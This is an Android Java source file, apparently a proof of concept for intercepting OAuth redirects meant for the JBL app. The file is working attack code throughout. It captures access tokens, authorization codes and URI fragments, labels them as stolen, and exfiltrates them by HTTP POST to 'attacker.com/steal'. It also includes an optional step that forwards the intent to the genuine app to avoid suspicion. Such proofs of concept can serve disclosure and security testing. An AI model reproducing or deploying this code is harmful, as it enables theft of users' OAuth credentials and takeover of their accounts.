package com.jblsteal;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Iterator;
import java.util.Set;

public class StealActivity extends Activity {

    private static final String TAG = "JBLSteal";
    private static final String ATTACKER_SERVER = "https://attacker.com/steal";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_steal);

        TextView logView = findViewById(R.id.log_view);
        StringBuilder log = new StringBuilder();

        // Intercept the intent
        Intent intent = getIntent();
        if (intent != null && intent.getData() != null) {
            Uri data = intent.getData();

            log.append("=== JBL OAuth INTERCEPTED ===\n\n");
            log.append("Full URI: ").append(data.toString()).append("\n\n");

            // Log all parameters
            log.append("Parameters:\n");
            Set<String> params = data.getQueryParameterNames();
            for (String param : params) {
                String value = data.getQueryParameter(param);
                log.append(param).append(": ").append(value).append("\n");
            }

            // Check for specific OAuth data
            String accessToken = data.getQueryParameter("access_token");
            String authCode = data.getQueryParameter("code");
            String tokenFragment = data.getFragment(); // For implicit flow

            if (accessToken != null) {
                log.append("\n🚨 ACCESS TOKEN STOLEN: ").append(accessToken).append("\n");
            }
            if (authCode != null) {
                log.append("\n🚨 AUTH CODE STOLEN: ").append(authCode).append("\n");
            }
            if (tokenFragment != null) {
                log.append("\n🚨 FRAGMENT DATA: ").append(tokenFragment).append("\n");
            }

            logView.setText(log.toString());

            // Exfiltrate stolen data to attacker server
            exfiltrateData(data.toString());

            Log.d(TAG, "Intercepted JBL OAuth: " + data.toString());

        } else {
            log.append("No OAuth data intercepted");
            logView.setText(log.toString());
        }

        // Optional: Forward to legitimate app to avoid suspicion
        // forwardToLegitimateApp(intent);
    }

    private void exfiltrateData(String stolenData) {
        new Thread(() -> {
            try {
                URL url = new URL(ATTACKER_SERVER);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);

                String postData = "stolen_oauth=" + Uri.encode(stolenData) +
                        "&app=com.jblsteal" +
                        "&timestamp=" + System.currentTimeMillis();

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                    os.flush();
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Exfiltration response: " + responseCode);

                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Exfiltration failed: " + e.getMessage());
            }
        }).start();
    }

    private void forwardToLegitimateApp(Intent originalIntent) {
        try {
            Intent forward = new Intent(originalIntent);
            forward.setPackage("com.jbl.oneapp"); // Target legitimate JBL app
            startActivity(forward);
        } catch (Exception e) {
            Log.e(TAG, "Failed to forward to JBL app: " + e.getMessage());
        }
        finish();
    }
}